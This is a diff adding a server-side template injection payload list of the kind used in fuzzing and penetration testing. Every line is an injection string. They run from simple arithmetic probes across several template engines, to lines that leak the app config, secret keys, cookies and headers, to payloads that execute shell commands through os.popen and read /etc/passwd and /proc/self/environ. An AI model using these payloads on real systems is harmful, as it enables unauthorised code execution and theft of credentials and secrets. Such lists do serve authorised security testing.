@@ -1,0 +1,27 @@
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+*{7*7}
+@{7*7}
+${7*7}
+${{<%[%'"}}%\
+{{config}}
+{{config.items()}}
+{{settings}}
+{{settings.SECRET_KEY}}
+{{request}}
+{{request.environ}}
+{{request.cookies}}
+{{request.headers}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('ls -la').read()}}
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/hosts').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[40]('/proc/self/environ').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[40]('/proc/self/cmdline').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}
